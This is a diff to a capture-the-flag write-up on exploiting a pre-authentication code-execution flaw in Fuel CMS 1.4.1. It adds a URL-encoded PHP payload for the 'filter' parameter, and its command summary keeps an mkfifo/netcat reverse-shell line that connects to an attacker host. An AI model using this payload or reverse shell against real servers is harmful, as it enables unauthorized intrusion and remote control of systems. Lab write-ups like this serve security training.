@@ -70,21 +70,27 @@ The dashboard contained sections for pages, blocks, assets, users, and settings,
 
 Fuel CMS 1.4.1 is vulnerable to a pre-authentication remote code execution vulnerability. The flaw exists in the `filter` parameter of the `/fuel/pages/select/` endpoint, which fails to sanitize user input before passing it to PHP's `eval()` function. This allows an attacker to inject arbitrary PHP code without authentication.
 
-A public exploit is available on Exploit-DB (ID 50477):
+A public exploit is available on Exploit-DB (ID 50477). A local copy is available in the room folder:
 
 ```bash
-searchsploit fuel cms
+ls exploit.py
 ```
 
-![Searchsploit finding Fuel CMS exploits](/assets/screenshots/ignite/searchsploit.png)
+The exploit sends a crafted GET request to `/fuel/pages/select/` with a URL-encoded PHP payload injected into the `filter` parameter, which gets passed directly to PHP's `eval()`:
+
+```
+/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27<cmd>%27%29%2b%27
+```
+
+Run it against the target:
 
 ```bash
-python3 50477.py -u http://<target-ip>/
+python3 exploit.py -u http://<target-ip>/
 ```
-
-The exploit provided an interactive command shell:
 
 ![RCE exploit running](/assets/screenshots/ignite/exploit_rce.png)
+
+The exploit provided an interactive command shell:
 
 ```bash
 Enter Command $ id
@@ -176,9 +182,8 @@ b9bbcb33e11b80be759c4e844862482d
 
 ```bash
 nmap -sV -sC -oN nmap.txt <target-ip>
-searchsploit fuel cms
-python3 50477.py -u http://<target-ip>/
-# Within exploit shell:
+python3 exploit.py -u http://<target-ip>/
+# Within exploit shell: (exploit.py in room folder)
 id
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 9001 >/tmp/f
 # In reverse shell:
